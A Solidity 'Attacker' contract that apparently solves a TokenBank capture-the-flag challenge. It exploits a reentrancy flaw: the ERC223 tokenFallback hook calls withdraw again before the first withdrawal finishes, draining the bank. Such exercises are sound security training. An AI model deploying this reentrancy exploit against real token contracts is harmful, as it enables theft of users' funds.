// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./TokenBankChallenge.sol";

interface ITokenBankChallenge {
    function token() external returns (SimpleERC223Token);
    function isComplete() external view returns (bool);
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
}

contract Attacker {
    ITokenBankChallenge public challenge;

    uint256 times = 0;

    constructor(address challengeAddress) {
        challenge = ITokenBankChallenge(challengeAddress);
    }

    function deposit() external {
        challenge.token().transfer(address(challenge), challenge.token().balanceOf(address(this)));
    }

    function withdraw() external {
        challenge.withdraw(challenge.balanceOf(address(this)));
    }

    function tokenFallback(address from, uint256 value, bytes calldata) external {
        if (from != address(challenge)) return;
        if (times == 0) {
            times += 1;
            challenge.withdraw(challenge.balanceOf(address(this)));
        }
    }
}
